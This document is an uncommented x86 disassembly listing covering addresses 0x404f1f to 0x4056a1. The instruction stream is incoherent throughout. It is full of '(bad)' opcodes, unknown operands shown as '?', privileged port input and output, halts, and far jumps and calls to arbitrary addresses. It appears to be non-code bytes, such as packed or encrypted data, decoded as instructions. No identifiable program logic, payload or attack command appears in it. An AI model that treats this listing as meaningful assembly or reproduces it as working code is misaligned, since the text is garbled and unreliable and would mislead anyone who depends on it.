  404f1f:	dec    edx
  404f20:	cld    
  404f21:	das    
  404f22:	pop    es
  404f23:	lock aam 0x65
  404f26:	pop    esi
  404f27:	std    
  404f28:	cli    
  404f29:	out    0xa3,al
  404f2b:	and    al,0x30
  404f2d:	jmp    0x14ec:0x45f58d8a
  404f34:	sub    BYTE PTR [edx+0x5f],bh
  404f37:	in     al,0xfb
  404f39:	ss out 0x19,eax
  404f3c:	fld    st(2)
  404f3e:	jo     0x404f32
  404f40:	shr    DWORD PTR [edx-0x2e],1
  404f43:	call   0xee0:0xee79c1ba
  404f4a:	imul   ebp,DWORD PTR [esi],0xd6ad7ece
  404f50:	nop
  404f51:	cld    
  404f52:	xchg   DWORD PTR [ebp+0x6729754d],ecx
  404f58:	fwait
  404f59:	or     cl,BYTE PTR [ebx+0x39c62ce9]
  404f5f:	or     BYTE PTR [edx],ch
  404f61:	sbb    eax,0xad5f014b
  404f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f67:	mov    ebx,0x98c2e887
  404f6c:	dec    ebx
  404f6d:	sti    
  404f6e:	es push 0x7b
  404f71:	fisttp WORD PTR [eax+0x6403a4a5]
  404f77:	xchg   esi,edi
  404f79:	or     BYTE PTR [edi+0x53],bh
  404f7c:	nop
  404f7d:	inc    edi
  404f7e:	pop    esi
  404f7f:	adc    ebp,esp
  404f81:	mov    bl,0x41
  404f83:	aam    0x86
  404f85:	stos   DWORD PTR es:[edi],eax
  404f86:	push   edx
  404f87:	(bad)  
  404f88:	adc    DWORD PTR [ecx+0x17],ecx
  404f8b:	loop   0x404fbb
  404f8d:	sti    
  404f8e:	jp     0x404f43
  404f90:	and    eax,0x5c3acd1e
  404f95:	cmp    DWORD PTR [edx+0x70],edx
  404f98:	hlt    
  404f99:	imul   edx,DWORD PTR [edi],0x71
  404f9c:	int    0x85
  404f9e:	xor    BYTE PTR [edi],0x53
  404fa1:	push   0xffffffd2
  404fa3:	mov    edi,gs
  404fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa6:	fdivr  DWORD PTR [ecx]
  404fa8:	hlt    
  404fa9:	inc    ecx
  404faa:	test   bl,bh
  404fac:	test   BYTE PTR [ebp-0x7a],cl
  404faf:	retf   
  404fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fb1:	or     al,0xac
  404fb3:	sbb    esp,esi
  404fb5:	jb     0x405007
  404fb7:	pusha  
  404fb8:	pop    ss
  404fb9:	in     al,0x8e
  404fbb:	sbb    DWORD PTR [ebx+0x6a],ebx
  404fbe:	cmp    BYTE PTR [ebx-0x189c0385],dh
  404fc4:	xcrypt-ecb (bad)
  404fc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fc6:	int3   
  404fc7:	clc    
  404fc8:	add    DWORD PTR [edi-0x68fbebdc],esi
  404fce:	repnz dec ebp
  404fd0:	cli    
  404fd1:	int    0xc8
  404fd3:	jns    0x404fb8
  404fd5:	push   esi
  404fd6:	(bad)  
  404fd7:	mov    ecx,0x954268f9
  404fdc:	daa    
  404fdd:	inc    edi
  404fde:	stos   DWORD PTR es:[edi],eax
  404fdf:	xchg   ecx,eax
  404fe0:	dec    esp
  404fe1:	imul   esp,DWORD PTR [eax+eiz*2-0x221ae33b],0x2e
  404fe9:	push   es
  404fea:	push   edi
  404feb:	xlat   BYTE PTR ds:[ebx]
  404fec:	shl    bh,1
  404fee:	retf   
  404fef:	pop    esi
  404ff0:	cmp    ah,BYTE PTR [eax-0x2f]
  404ff3:	mov    ah,0xaf
  404ff5:	loope  0x404fd5
  404ff7:	cdq    
  404ff8:	push   es
  404ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ffa:	out    0x33,al
  404ffc:	push   edx
  404ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ffe:	in     eax,0x5a
  405000:	dec    edi
  405001:	retf   
  405002:	mov    eax,ds:0x5fbb4917
  405007:	in     al,0x57
  405009:	jmp    0xb152:0xc1637a79
  405010:	in     eax,0xf0
  405012:	mov    DWORD PTR [eax],eax
  405014:	(bad)  
  405015:	fst    st(6)
  405017:	cmp    eax,0x99e9c8b3
  40501c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40501d:	and    al,0x38
  40501f:	nop
  405020:	fiadd  WORD PTR [edx-0x609d9358]
  405026:	mov    ds:0x94459001,eax
  40502b:	xchg   ebp,eax
  40502c:	cmp    al,0xaf
  40502e:	ret    
  40502f:	call   0xaa87e406
  405034:	xchg   esi,eax
  405035:	push   ecx
  405036:	xchg   ebx,eax
  405037:	mov    DWORD PTR [eax],esp
  405039:	mov    ?,eax
  40503b:	mov    ebp,0x7a569ad1
  405040:	sbb    BYTE PTR ds:0xc7a1f2fd,0x5b
  405047:	mov    bl,0x9f
  405049:	icebp  
  40504a:	ret    
  40504b:	ret    0x21e1
  40504e:	sbb    edi,edi
  405050:	bound  edi,QWORD PTR [edi+0x2663beb8]
  405056:	fsub   QWORD PTR ds:0x2ead094b
  40505c:	idiv   BYTE PTR [ecx]
  40505e:	mov    ch,0xd5
  405060:	mov    eax,ds:0x8bf7630e
  405065:	aam    0x76
  405067:	sbb    dl,BYTE PTR [edi]
  405069:	pop    esp
  40506a:	fstp   st(5)
  40506c:	out    dx,eax
  40506d:	push   esi
  40506e:	push   0x7adc7643
  405073:	aaa    
  405074:	mov    ebp,0x5fd34a39
  405079:	and    BYTE PTR [di],ch
  40507c:	adc    ebp,DWORD PTR [ebp-0x39]
  40507f:	popf   
  405080:	adc    BYTE PTR [ebp-0x1d103c01],bh
  405086:	es nop
  405088:	xchg   edi,eax
  405089:	mov    cl,0xfa
  40508b:	xor    BYTE PTR [ebx-0x38],0x1c
  40508f:	inc    ebp
  405090:	popa   
  405091:	cmp    DWORD PTR [ebp+0x77],eax
  405094:	aam    0x10
  405096:	imul   ebp,DWORD PTR ds:0x2fc48407,0x14143564
  4050a0:	retf   
  4050a1:	inc    ecx
  4050a2:	test   BYTE PTR [edi-0x7b],al
  4050a5:	aaa    
  4050a6:	aas    
  4050a7:	and    DWORD PTR [ecx],esi
  4050a9:	fcmovb st,st(3)
  4050ab:	adc    al,0x5b
  4050ad:	xlat   BYTE PTR ds:[ebx]
  4050ae:	add    ecx,esp
  4050b0:	cmp    al,0x42
  4050b2:	sbb    al,BYTE PTR [edx-0x9]
  4050b5:	clc    
  4050b6:	sbb    BYTE PTR [eax+0x56522404],ch
  4050bc:	test   al,0xef
  4050be:	jae    0x405101
  4050c0:	and    ah,BYTE PTR [ebp+edi*2+0x41]
  4050c4:	(bad)  
  4050c5:	mov    bh,0x6c
  4050c7:	icebp  
  4050c8:	mov    eax,ds:0xa15bb0a0
  4050cd:	ss inc ebp
  4050cf:	ret    
  4050d0:	cld    
  4050d1:	mov    WORD PTR [esi-0x28],?
  4050d4:	jns    0x405084
  4050d6:	push   edx
  4050d7:	mov    bh,0xac
  4050d9:	pop    eax
  4050da:	adc    DWORD PTR [eax],eax
  4050dc:	inc    edi
  4050dd:	xor    al,0xaf
  4050df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050e0:	sub    ebx,DWORD PTR [esi]
  4050e2:	xchg   edi,eax
  4050e3:	fld    DWORD PTR [ecx+0x3d]
  4050e6:	in     al,dx
  4050e7:	frstor [edx-0x14aecb51]
  4050ed:	pop    ebx
  4050ee:	gs ins BYTE PTR es:[edi],dx
  4050f0:	cmp    dl,ah
  4050f2:	jmp    0x4fb97854
  4050f7:	in     al,0x6e
  4050f9:	std    
  4050fa:	dec    esp
  4050fb:	adc    BYTE PTR [edx-0x44],dh
  4050fe:	nop
  4050ff:	add    al,0x62
  405101:	cdq    
  405102:	and    DWORD PTR [eax+ebp*2+0x51],ecx
  405106:	xchg   ebx,eax
  405107:	pop    eax
  405108:	test   al,0x5
  40510a:	ror    dl,1
  40510c:	sub    BYTE PTR [ebx],bl
  40510e:	xchg   ebp,eax
  40510f:	adc    al,0xc8
  405111:	test   al,0x1c
  405113:	xchg   ebp,eax
  405114:	adc    al,0x6
  405116:	sbb    al,BYTE PTR [edi+ecx*2+0x26]
  40511a:	scas   al,BYTE PTR es:[edi]
  40511b:	ss jge 0x405138
  40511e:	icebp  
  40511f:	loope  0x405196
  405121:	add    BYTE PTR [ebx],ah
  405123:	fs popf 
  405125:	jp     0x40510c
  405127:	and    DWORD PTR [edx],edi
  405129:	scas   eax,DWORD PTR es:[edi]
  40512a:	jbe    0x405126
  40512c:	dec    edx
  40512d:	sub    al,0x1e
  40512f:	les    edx,FWORD PTR [edx]
  405131:	xchg   edi,eax
  405132:	push   ebx
  405133:	xchg   esp,eax
  405134:	cld    
  405135:	fadd   st(6),st
  405137:	in     eax,dx
  405138:	xadd   BYTE PTR [edi],ch
  40513b:	pop    ecx
  40513c:	or     DWORD PTR [ebx+eiz*8],esi
  40513f:	inc    ebp
  405140:	add    eax,0xd7ec37fb
  405145:	pop    ebx
  405146:	dec    ecx
  405147:	loope  0x405108
  405149:	sahf   
  40514a:	xor    ch,BYTE PTR [ebp+0x4375fa9e]
  405150:	xor    eax,0x7204f0f9
  405155:	mov    bl,0xdd
  405157:	push   0x40
  405159:	dec    edi
  40515a:	ss inc esp
  40515c:	(bad)  
  40515d:	xchg   BYTE PTR fs:[edi+ecx*4-0x5cc1dbad],al
  405165:	xchg   edi,eax
  405166:	mov    dh,0xd8
  405168:	test   eax,0xebebf22a
  40516d:	add    ch,BYTE PTR [ebp+0x1]
  405170:	stos   DWORD PTR es:[edi],eax
  405171:	in     al,dx
  405172:	repnz dec ebp
  405174:	push   cs
  405175:	push   esp
  405176:	leave  
  405177:	add    ah,dh
  405179:	jne    0x405141
  40517b:	(bad)  
  40517c:	dec    ebx
  40517d:	add    DWORD PTR [ebx],esp
  40517f:	inc    eax
  405180:	pop    edx
  405181:	xor    bh,BYTE PTR [ecx+0x39]
  405184:	in     eax,0x5c
  405186:	mov    al,ds:0x9be17b27
  40518b:	push   edi
  40518c:	mov    al,0xb1
  40518e:	cli    
  40518f:	ja     0x405133
  405191:	jo     0x4051fb
  405193:	or     ebx,esp
  405195:	jne    0x4051fa
  405197:	xchg   ecx,eax
  405198:	inc    edx
  405199:	int3   
  40519a:	pop    esi
  40519b:	cli    
  40519c:	dec    edx
  40519d:	iret   
  40519e:	sbb    al,0x55
  4051a0:	int    0xa2
  4051a2:	xchg   BYTE PTR [eax+0x5652c9d3],ch
  4051a8:	callw  0xefb2
  4051ac:	inc    esp
  4051ad:	ins    DWORD PTR es:[edi],dx
  4051ae:	jnp    0x40521c
  4051b0:	adc    eax,0x528d2c35
  4051b5:	pop    edx
  4051b6:	xchg   ecx,eax
  4051b7:	jbe    0x405189
  4051b9:	rcl    BYTE PTR [esi],cl
  4051bb:	add    DWORD PTR [esi],eax
  4051bd:	int    0xdd
  4051bf:	ds pop esi
  4051c1:	sub    BYTE PTR [ebx+0x29],dh
  4051c4:	mov    ebp,0x379462d4
  4051c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051ca:	mov    al,ah
  4051cc:	test   DWORD PTR [edx],esi
  4051ce:	jl     0x4051f0
  4051d0:	mov    BYTE PTR ds:0x964a9bd0,ah
  4051d6:	add    edi,edx
  4051d8:	les    edi,FWORD PTR ds:0xf0086a5d
  4051de:	add    bl,ch
  4051e0:	fnstenv [eax-0x7a]
  4051e3:	pop    ecx
  4051e4:	sti    
  4051e5:	aaa    
  4051e6:	es add eax,0x59fdfac8
  4051ec:	fdiv   QWORD PTR [esi-0x6096b5fe]
  4051f3:	inc    edx
  4051f4:	test   BYTE PTR [edi],0x50
  4051f7:	and    al,0x5a
  4051f9:	lods   eax,DWORD PTR ds:[esi]
  4051fa:	dec    ebp
  4051fb:	dec    ebp
  4051fc:	data16 jno 0x405218
  4051ff:	mov    ebp,0xf64080b5
  405204:	ror    BYTE PTR [ecx-0x4e9862f0],0x11
  40520b:	stos   BYTE PTR es:[edi],al
  40520c:	mov    ebx,0xcbe86623
  405211:	in     eax,dx
  405212:	adc    ebx,ebp
  405214:	pop    ecx
  405215:	loopne 0x4051d5
  405217:	or     edx,DWORD PTR cs:[eax+0x6fb851fb]
  40521e:	or     BYTE PTR [edi],dl
  405220:	jbe    0x405295
  405222:	in     al,0xf5
  405224:	aaa    
  405225:	pusha  
  405226:	sub    DWORD PTR [edi],ebp
  405228:	adc    bl,bh
  40522a:	js     0x405260
  40522c:	push   esi
  40522d:	or     ch,BYTE PTR [ebx+0x2]
  405230:	adc    al,0x86
  405232:	jae    0x4051bf
  405234:	scas   eax,DWORD PTR es:[edi]
  405235:	jp     0x405253
  405237:	mov    al,ds:0x17db5d27
  40523c:	and    bh,BYTE PTR [ecx]
  40523e:	stc    
  40523f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405240:	imul   edi,DWORD PTR ds:0xdc609e2,0xd4166992
  40524a:	mov    bl,0x8f
  40524c:	cmp    edi,DWORD PTR [ecx+0x6d38cb64]
  405252:	push   edi
  405253:	mov    cl,0x5
  405255:	daa    
  405256:	sub    BYTE PTR [edx-0x6ac798cd],al
  40525c:	push   0xceca20f6
  405261:	scas   al,BYTE PTR es:[edi]
  405262:	dec    edi
  405263:	push   ebp
  405264:	aam    0x4e
  405266:	dec    ebp
  405267:	ret    0x355b
  40526a:	scas   al,BYTE PTR es:[edi]
  40526b:	(bad)  
  40526c:	ins    DWORD PTR es:[edi],dx
  40526d:	aaa    
  40526e:	xchg   ebp,eax
  40526f:	mov    esi,0xeb7571ab
  405274:	push   cs
  405275:	xchg   edx,eax
  405276:	outs   dx,DWORD PTR ds:[esi]
  405277:	mov    ds:0x12c11ac9,al
  40527c:	xor    eax,0xf5086c53
  405281:	outs   dx,DWORD PTR ds:[esi]
  405282:	pushf  
  405283:	push   esp
  405284:	dec    edx
  405285:	arpl   WORD PTR [ebx],ax
  405287:	das    
  405288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405289:	sbb    eax,0xedc032b9
  40528e:	mov    ds:0xd8fde584,eax
  405293:	(bad)  
  405294:	cmc    
  405295:	mov    bl,0xd9
  405297:	jne    0x4052ac
  405299:	fistp  QWORD PTR [esi+0x4]
  40529c:	mov    dh,BYTE PTR [eax]
  40529e:	out    dx,eax
  40529f:	(bad)  
  4052a1:	ins    BYTE PTR es:[edi],dx
  4052a2:	fistp  WORD PTR ds:0x2f1a2322
  4052a8:	scas   al,BYTE PTR es:[edi]
  4052a9:	pop    esi
  4052aa:	pop    esp
  4052ab:	hlt    
  4052ac:	aas    
  4052ad:	imul   edx,DWORD PTR [edx+0x715c53e6],0xffffff90
  4052b4:	std    
  4052b5:	or     eax,0x32d1bb90
  4052ba:	out    dx,al
  4052bb:	lods   eax,DWORD PTR ds:[esi]
  4052bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052bd:	push   cs
  4052be:	xchg   ebx,eax
  4052bf:	add    eax,0x9f89c5f3
  4052c4:	out    0x97,al
  4052c6:	call   0x9beb3461
  4052cb:	loope  0x405303
  4052cd:	mov    al,ds:0xdbb2f2bf
  4052d2:	shl    BYTE PTR [eax-0x80],0x2
  4052d6:	fcomp  QWORD PTR [edx]
  4052d8:	or     dh,al
  4052da:	sub    edx,DWORD PTR [ecx+0x5423525f]
  4052e0:	adc    al,0xb1
  4052e2:	jge    0x40530b
  4052e4:	xor    al,0x9c
  4052e6:	pop    edx
  4052e7:	mov    esp,0x85ee5bac
  4052ec:	int3   
  4052ed:	cmp    dl,BYTE PTR [esp+eax*4-0x43]
  4052f1:	mov    bh,0x0
  4052f3:	adc    ah,dh
  4052f5:	aas    
  4052f6:	inc    edx
  4052f7:	scas   al,BYTE PTR es:[edi]
  4052f8:	lds    ecx,FWORD PTR es:[edi-0x17]
  4052fc:	outs   dx,BYTE PTR ds:[esi]
  4052fd:	mov    esp,0x81985daf
  405302:	fstp   DWORD PTR [ecx+ebx*8+0x26f33002]
  405309:	mov    edi,0xa564d8dd
  40530e:	dec    ebp
  40530f:	cdq    
  405310:	sbb    DWORD PTR [ebx],ecx
  405312:	lods   eax,DWORD PTR ds:[esi]
  405313:	loope  0x4052ef
  405315:	in     al,dx
  405316:	add    ebp,DWORD PTR [edi-0x1c]
  405319:	mov    DWORD PTR [eax+0x66a0bbb7],ebx
  40531f:	(bad)  
  405321:	stos   BYTE PTR es:[edi],al
  405322:	add    DWORD PTR [ebx-0x21],0x4
  405326:	ins    BYTE PTR es:[edi],dx
  405327:	jb     0x405352
  405329:	imul   esi,DWORD PTR [edx+0x70752f01],0x22788333
  405333:	sub    eax,0x3154e740
  405338:	mov    ds:0x1ff3af45,eax
  40533d:	not    BYTE PTR [eax+0x37ab0183]
  405343:	in     eax,dx
  405344:	add    DWORD PTR [ebp+eiz*8+0x4303c54d],ecx
  40534b:	fchs   
  40534d:	scas   eax,DWORD PTR es:[edi]
  40534e:	fsubr  DWORD PTR [ecx]
  405350:	not    DWORD PTR [edx-0x17d75c43]
  405356:	or     cl,BYTE PTR [edx-0x35]
  405359:	jbe    0x4052e6
  40535b:	jnp    0x40531a
  40535d:	call   0x6bf3:0xf44a3554
  405364:	shl    BYTE PTR ds:[eax+edx*8+0x1],0xd2
  40536a:	mov    ds:0xbed5729a,eax
  40536f:	adc    bh,BYTE PTR [esi]
  405371:	push   esi
  405372:	mov    ds:0x988be1ea,al
  405377:	and    edx,DWORD PTR [ebp-0x35c67c06]
  40537d:	and    eax,0x4f544b79
  405382:	xor    DWORD PTR [eax],edx
  405384:	jae    0x405376
  405386:	ins    BYTE PTR es:[edi],dx
  405387:	sub    esp,eax
  405389:	mov    ah,0x7c
  40538b:	mov    ?,WORD PTR [edx+0x15]
  40538e:	sub    BYTE PTR [edi-0x2],bl
  405391:	inc    eax
  405392:	xor    eax,DWORD PTR [ebp-0x16]
  405395:	mov    ch,0xb0
  405397:	mov    al,ds:0xf1db4f21
  40539c:	cmp    al,0x19
  40539e:	lds    edx,FWORD PTR [ebx+ebx*8]
  4053a1:	loop   0x4053cf
  4053a3:	icebp  
  4053a4:	psubsb mm2,mm5
  4053a7:	loopne 0x405417
  4053a9:	lods   al,BYTE PTR ds:[esi]
  4053aa:	jp     0x405393
  4053ac:	ror    DWORD PTR fs:[edx+0x403feb49],cl
  4053b3:	mov    esp,DWORD PTR [edx]
  4053b5:	dec    esp
  4053b6:	rol    ch,1
  4053b8:	jmp    0x90f8:0xc7a9ab17
  4053bf:	(bad)  
  4053c0:	pop    ss
  4053c1:	jo     0x405435
  4053c3:	push   ecx
  4053c4:	mov    ebx,0xc155b2a3
  4053c9:	fwait
  4053ca:	test   eax,0xc6b0cc91
  4053cf:	iret   
  4053d0:	mov    esp,DWORD PTR [ebx-0x3ae926ab]
  4053d6:	bound  ebp,QWORD PTR [edi+0x3d]
  4053d9:	clc    
  4053da:	ja     0x405456
  4053dc:	les    edx,FWORD PTR [eax]
  4053de:	lods   al,BYTE PTR ds:[esi]
  4053df:	test   al,0x9e
  4053e1:	ins    BYTE PTR es:[edi],dx
  4053e2:	xor    BYTE PTR [ecx-0x6f],dl
  4053e5:	fs cmp al,0x97
  4053e8:	mov    ecx,DWORD PTR [ebx]
  4053ea:	pop    esp
  4053eb:	add    eax,DWORD PTR [esi+0x7a]
  4053ee:	stos   DWORD PTR es:[edi],eax
  4053ef:	xchg   edx,eax
  4053f0:	inc    ecx
  4053f1:	pop    edx
  4053f2:	js     0x40542f
  4053f4:	pop    eax
  4053f5:	sub    al,0x28
  4053f7:	xor    ebp,DWORD PTR ss:[ecx-0x4b38dc1e]
  4053fe:	clc    
  4053ff:	test   BYTE PTR [edx],bl
  405401:	cmp    eax,0x48ae9e0a
  405406:	in     eax,0x37
  405408:	adc    edi,DWORD PTR [ecx-0x5944bb16]
  40540e:	ins    BYTE PTR es:[edi],dx
  40540f:	ja     0x405436
  405411:	arpl   ax,dx
  405413:	rcr    BYTE PTR [edx+0x2c],0x25
  405417:	pop    esi
  405418:	fstp   DWORD PTR ss:0x6e611efa
  40541f:	inc    edi
  405420:	(bad)  
  405421:	stos   BYTE PTR es:[edi],al
  405422:	ror    DWORD PTR [eax],cl
  405424:	cmp    BYTE PTR [ebx-0x5c046c21],ah
  40542a:	aad    0xf5
  40542c:	in     eax,0x9a
  40542e:	aam    0xcd
  405430:	mov    ecx,DWORD PTR [esi]
  405432:	sbb    edi,DWORD PTR [ebp+0x4d29d822]
  405438:	vpmuldq xmm5,xmm5,xmm0
  40543d:	lods   eax,DWORD PTR ds:[esi]
  40543e:	int3   
  40543f:	push   ebp
  405440:	inc    eax
  405441:	test   eax,0x8e57b84e
  405446:	daa    
  405447:	ror    DWORD PTR [edi],1
  405449:	push   ds
  40544a:	fwait
  40544b:	retf   0xfce3
  40544e:	repz sahf 
  405450:	(bad)  
  405451:	mov    cl,0x19
  405453:	ds ins BYTE PTR es:[edi],dx
  405455:	out    0xc9,eax
  405457:	mov    ah,BYTE PTR [ebp+0x32]
  40545a:	pop    edx
  40545b:	jle    0x405455
  40545d:	pop    es
  40545e:	out    dx,al
  40545f:	and    eax,0x71bf5b54
  405464:	loop   0x405463
  405466:	fucom  st(0)
  405468:	mov    ?,WORD PTR [eax+0x0]
  40546b:	adc    BYTE PTR [edi-0x5],al
  40546e:	mov    WORD PTR [eax+0x1c],cs
  405471:	cmp    cl,ah
  405473:	pop    eax
  405474:	dec    esi
  405475:	ja     0x4054ea
  405477:	sbb    BYTE PTR [esi-0x77],ah
  40547a:	mov    al,ds:0x81f111ec
  40547f:	push   ebp
  405480:	sbb    DWORD PTR [ecx+0x6f3013b9],eax
  405486:	xor    BYTE PTR [esi+0x3a],cl
  405489:	pop    es
  40548a:	(bad)  
  40548b:	pop    esi
  40548c:	xor    al,0x6b
  40548e:	xchg   ebp,eax
  40548f:	cmc    
  405490:	jnp    0x405422
  405492:	xchg   ebx,eax
  405493:	mov    ecx,0xb3967481
  405498:	ja     0x4054d6
  40549a:	retf   0x33fd
  40549d:	cmc    
  40549e:	inc    eax
  40549f:	cli    
  4054a0:	into   
  4054a1:	out    dx,eax
  4054a2:	fsqrt  
  4054a4:	jae    0x4054d4
  4054a6:	test   al,0xc0
  4054a8:	test   BYTE PTR [eax+0x7ff78cd2],bl
  4054ae:	cmp    BYTE PTR [eax+0x38],bl
  4054b1:	gs or  al,0x9b
  4054b4:	jmp    0x893b:0x1d0c6b3f
  4054bb:	iret   
  4054bc:	dec    esi
  4054bd:	mov    bh,0xa7
  4054bf:	ss sub BYTE PTR gs:[eax-0x7d],0x4c
  4054c5:	xchg   esi,eax
  4054c6:	sbb    BYTE PTR [edi-0x3e],0xd5
  4054ca:	mov    bl,0x7a
  4054cc:	cli    
  4054cd:	ins    BYTE PTR es:[edi],dx
  4054ce:	sub    DWORD PTR [ebp-0x2b59a0f4],ebx
  4054d4:	dec    esp
  4054d5:	enter  0xe15,0x41
  4054d9:	les    esi,FWORD PTR [edi+0x0]
  4054dc:	cmp    ch,bl
  4054de:	sbb    al,0xa7
  4054e0:	pop    es
  4054e1:	arpl   WORD PTR [edi+0x33],sp
  4054e4:	add    eax,0x709b417b
  4054e9:	stos   BYTE PTR es:[edi],al
  4054ea:	fsub   DWORD PTR [ecx]
  4054ec:	scas   al,BYTE PTR es:[edi]
  4054ed:	dec    eax
  4054ee:	scas   eax,DWORD PTR es:[edi]
  4054ef:	sub    dh,BYTE PTR [ecx+0x2fd3258f]
  4054f5:	jl     0x405478
  4054f7:	cmp    ch,BYTE PTR [ecx-0x5913ff43]
  4054fd:	inc    edi
  4054fe:	push   ds
  4054ff:	loop   0x40552c
  405501:	mov    edx,esp
  405503:	mov    ds:0x5a5ac852,eax
  405508:	jno    0x4054ec
  40550a:	outs   dx,BYTE PTR ds:[esi]
  40550b:	xor    eax,0x57730c41
  405510:	xor    BYTE PTR [edi-0x63],bh
  405513:	ja     0x405533
  405515:	cmp    ebp,DWORD PTR [ebx]
  405517:	icebp  
  405518:	xlat   BYTE PTR ds:[ebx]
  405519:	dec    edi
  40551a:	xchg   ecx,eax
  40551b:	and    DWORD PTR [edx],ecx
  40551d:	sbb    DWORD PTR [edx],esi
  40551f:	pop    eax
  405520:	iret   
  405521:	fdivr  QWORD PTR [ecx-0x80]
  405524:	push   ss
  405525:	sar    DWORD PTR ss:[eax*1+0x64f51d85],cl
  40552d:	lea    ebp,[edi-0x21]
  405530:	retf   
  405531:	mov    ss,WORD PTR [esi-0x3d]
  405534:	sub    bx,WORD PTR [ecx]
  405537:	sub    ah,BYTE PTR [esi]
  405539:	add    cl,cl
  40553b:	push   edi
  40553c:	in     eax,0xe
  40553e:	(bad)  
  40553f:	(bad)  
  405540:	retf   0x825d
  405543:	pop    ebx
  405544:	sahf   
  405545:	add    BYTE PTR [ebx-0x65426961],0x91
  40554c:	cmp    al,0x42
  40554e:	xchg   dx,ax
  405550:	ja     0x40557d
  405552:	enter  0x1cae,0x2c
  405556:	push   ss
  405557:	shl    esi,1
  405559:	data16 cmc 
  40555b:	xchg   edx,eax
  40555c:	inc    edx
  40555d:	leave  
  40555e:	sub    eax,0xe01ec9ad
  405563:	inc    esp
  405564:	nop
  405565:	adc    al,0xf8
  405567:	hlt    
  405568:	and    edi,DWORD PTR ds:0x68157178
  40556e:	aad    0x96
  405570:	mov    eax,0xdce58d01
  405575:	fst    QWORD PTR [edx+ebp*4+0x8367352]
  40557c:	(bad)  
  40557d:	pushf  
  40557e:	aam    0x2
  405580:	lods   eax,DWORD PTR fs:[esi]
  405582:	inc    esp
  405583:	jns    0x405512
  405585:	icebp  
  405586:	lahf   
  405587:	xchg   ebx,eax
  405588:	aad    0x7e
  40558a:	inc    ebp
  40558b:	xor    ch,BYTE PTR [edx-0x3976aeb2]
  405591:	test   eax,0xccd839e0
  405596:	dec    ebx
  405597:	fcom   st(0)
  405599:	hlt    
  40559a:	sub    eax,0x6c527d21
  40559f:	push   esi
  4055a0:	sub    ebp,DWORD PTR [edi+0x54bd4905]
  4055a6:	lahf   
  4055a7:	jecxz  0x4055b0
  4055a9:	popa   
  4055aa:	cmp    al,0x64
  4055ac:	pop    ds
  4055ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055ae:	pop    eax
  4055af:	imul   DWORD PTR [ebp-0x8a59b68]
  4055b5:	lds    esi,FWORD PTR [edx]
  4055b7:	call   0x5e9a3eb7
  4055bc:	inc    eax
  4055bd:	out    dx,eax
  4055be:	je     0x4055b6
  4055c0:	sbb    bl,BYTE PTR [ecx]
  4055c2:	jge    0x405631
  4055c4:	sub    al,0xeb
  4055c6:	jne    0x405618
  4055c8:	(bad)  
  4055c9:	push   esp
  4055ca:	or     ch,dl
  4055cc:	imul   edx,DWORD PTR [ebx+0x14],0x2dcf5b3
  4055d3:	mov    edx,0xd1b46157
  4055d8:	add    BYTE PTR [ecx+0x59],0x0
  4055dc:	dec    ecx
  4055dd:	in     eax,0x82
  4055df:	push   ds
  4055e0:	cmp    ch,BYTE PTR [eax+0x6e23db24]
  4055e6:	out    0x6c,eax
  4055e8:	ins    DWORD PTR es:[edi],dx
  4055e9:	pop    ds
  4055ea:	fcom   QWORD PTR ss:[ecx-0x717aabf0]
  4055f1:	ja     0x40566d
  4055f3:	mov    bh,0xc7
  4055f5:	pop    ebp
  4055f6:	cmp    ch,BYTE PTR [ebp+edx*4-0x59]
  4055fa:	jno    0x405633
  4055fc:	repnz mov cl,0xc7
  4055ff:	or     eax,0x8eea6d9c
  405604:	fstp   st(6)
  405606:	mov    esi,0xe236e9ca
  40560b:	mov    eax,0x5cd48ab8
  405610:	sub    ah,BYTE PTR [edx+0x62]
  405613:	and    ebx,esi
  405615:	xchg   edi,eax
  405616:	jo     0x405603
  405618:	cmp    DWORD PTR [ecx+0x2af04f98],ebx
  40561e:	outs   dx,BYTE PTR ds:[esi]
  40561f:	pop    es
  405620:	mov    ah,0xe6
  405622:	push   es
  405623:	fst    QWORD PTR [esi+0x3d94ca56]
  405629:	mov    ss,ecx
  40562b:	mov    ecx,0x7d583fa3
  405630:	dec    ebp
  405631:	fcomp  QWORD PTR [eax-0x73]
  405634:	retf   
  405635:	ret    
  405636:	mov    WORD PTR [ebp-0x2a],ss
  405639:	mov    dl,0xd0
  40563b:	dec    edx
  40563c:	out    dx,eax
  40563d:	mov    dh,0xf8
  40563f:	or     edi,DWORD PTR [ecx]
  405641:	icebp  
  405642:	mov    edx,DWORD PTR [esp+edi*1-0x5cd4bacd]
  405649:	(bad)  
  40564a:	(bad)  
  40564b:	sbb    esi,DWORD PTR [eax]
  40564d:	outs   dx,BYTE PTR ds:[esi]
  40564e:	mov    al,ds:0x390cb612
  405653:	add    al,BYTE PTR [ebx+0x5df0f280]
  405659:	int    0xfa
  40565b:	push   0xe86995d
  405660:	cmp    dl,BYTE PTR [edx]
  405662:	and    BYTE PTR [edi],0x1c
  405665:	shr    BYTE PTR [eax],cl
  405667:	mov    eax,0x7f41099c
  40566c:	call   0xa5d0:0xe109d18
  405673:	pop    ebp
  405674:	push   edx
  405675:	xchg   eax,esi
  405677:	xchg   ebx,eax
  405678:	jl     0x4056f5
  40567a:	xor    BYTE PTR [ebp+0x3699a996],0xeb
  405681:	push   es
  405682:	ror    DWORD PTR [esi+0x31e6479b],cl
  405688:	jmp    0xf268e61b
  40568d:	push   eax
  40568e:	mov    ds:0x516c6fff,eax
  405693:	enter  0x41a1,0xd4
  405697:	cli    
  405698:	inc    esp
  405699:	cmp    al,0x72
  40569b:	and    DWORD PTR [esi],ebx
  40569d:	cdq    
  40569e:	ror    ah,1
  4056a0:	ins    BYTE PTR es:[edi],dx
  4056a1:	mov    dh,BYTE PTR [esi-0x62]
